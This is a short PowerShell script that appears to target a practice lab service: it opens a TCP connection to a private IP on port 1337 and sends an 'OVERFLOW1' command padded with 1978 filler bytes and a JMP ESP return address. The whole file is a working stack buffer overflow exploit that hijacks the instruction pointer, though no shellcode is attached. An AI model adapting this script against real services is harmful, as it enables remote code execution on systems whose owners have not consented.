$server = '10.10.173.119'
$port = 1337
[byte[]][char[]]$function = 'OVERFLOW1 '
[byte[]]$jmpesp = @(0xaf,0x11,0x50,0x62) # JMP ESP: 625011AF little endian
[byte[]][char[]]$eip = 'A' * 1978
$pwnz = $function + $eip + $jmpesp
$socket = [System.Net.Sockets.TcpClient]::new()

try {
    $socket.Client.Connect($server, $port)
}
catch {
    $socket.Close()
    $socket.Dispose()
}

try {
    $socket.Client.Send($pwnz)
    $socket.Close()
    $socket.Dispose()
}
catch {
    $socket.Close()
    $socket.Dispose()
    throw $_.Exception
}